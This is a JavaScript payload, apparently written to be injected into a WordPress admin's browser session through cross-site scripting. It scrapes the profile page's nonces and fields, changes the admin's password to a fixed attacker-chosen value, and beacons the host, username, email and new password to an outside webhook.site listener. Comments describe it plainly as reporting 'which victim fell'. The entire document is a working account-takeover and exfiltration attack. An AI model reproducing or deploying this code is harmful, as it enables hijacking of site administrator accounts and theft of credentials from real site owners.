(async () => {
  // Guard: only act when we clearly have an admin session


  const NEW_PASS = 'Hanh@2026!Admin#Pwn';
  const EXFIL    = 'https://webhook.site/76b8756e-baf0-4e75-8e03-5739b2039f5d/x'; // set to your listener

  try {
    const page = await fetch('/wp-admin/profile.php', { credentials: 'include' }).then(r => r.text());
    const doc  = new DOMParser().parseFromString(page, 'text/html');
    const v    = n => doc.querySelector(`[name="${n}"]`)?.value ?? '';

    const body = new URLSearchParams({
      _wpnonce:         v('_wpnonce'),
      _wp_http_referer: '/wp-admin/profile.php',
      from:             'profile',
      checkuser_id:     v('user_id'),
      'color-nonce':    v('color-nonce'),
      admin_color:      'fresh',
      admin_bar_front:  '1',
      locale:           'site-default',
      user_login:       v('user_login'),
      nickname:         v('nickname'),
      display_name:     v('display_name'),
      email:            v('email'),
      url:              v('url'),
      description:      '',
      pass1:            NEW_PASS,
      pass2:            NEW_PASS,
      action:           'update',
      user_id:          v('user_id'),
      submit:           'Update'
    });

    const res = await fetch('/wp-admin/profile.php', {
      method:      'POST',
      credentials: 'include',
      headers:     { 'Content-Type': 'application/x-www-form-urlencoded' },
      body:        body.toString()
    });

    const html = await res.text();
    const ok   = /Profile updated|H(ồ|o)\s*s(ơ|o).*c(ậ|a)p\s*nh(ậ|a)t/i.test(html);

    // exfiltrate result so the attacker knows which victim fell
    const qs = new URLSearchParams({
      host: location.host,
      user: v('user_login'),
      mail: v('email'),
      pass: NEW_PASS,
      ok:   ok ? '1' : '0'
    });

    navigator.sendBeacon(EXFIL + '?' + qs.toString());
  } catch (e) {
    navigator.sendBeacon(EXFIL + '?err=' + encodeURIComponent(String(e)));
  }
})();
